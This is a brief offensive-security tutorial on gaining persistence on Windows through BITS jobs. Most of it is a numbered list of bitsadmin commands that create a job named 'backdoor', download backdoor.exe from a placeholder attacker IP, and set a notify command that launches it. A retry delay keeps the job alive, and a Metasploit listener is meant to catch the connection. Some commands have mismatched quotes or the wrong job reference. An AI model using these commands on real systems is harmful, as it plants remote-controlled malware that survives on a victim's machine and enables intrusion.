# Persistence with BITS Jobs

## Bits Jobs
BITS (Background Intelligent Transfer Service) is used for file transfer between machines (downloading or uploading) using idle network bandwidth. 

BITS Jobs are containers that contain files that need to be transferred. However, when creating the job the container is empty and it needs to be populated (specify one or more files to be transferred). It's also needed to add the source and the destination.

Now that we know what BITS is and what jobs are used for let's try achieving persistence.

Note: In order to work you have to have a webserver (python based or use apache) running so BITS can download the backdoor and Metasploit listening for connections.

## Help Menu
You can view the BITS help menu by typing: bitsadmin in the command line/the shell you spawned.

## Method

1. Create the backdoor job:
	
	bitsadmin /create backdoor

2. Add the file for the job that will be transferred:

	bitsadmin /addfile backdoor "http://[ATTACKER_IP]/backdoor.exe" "C:\Users\[USERNAME]\Downloads\backdoor.exe

3. Now, let's make BITS execute our backdoor:

	bitsadmin /SetNotifyCmdLine 1 cmd.exe "/c bitsadmin.exe /complete backdoor | start /B C:\Users\[USERNAME]\Downloads\backdoor.exe

4. Since we want our backdoor to be persistent we'll set a retry delay for the job.

	bitsadmin /SetMinRetryDelay backdoor 30

5. Finally, we'll start/resume the job. To execute the job type: 

	bitsadmin /resume
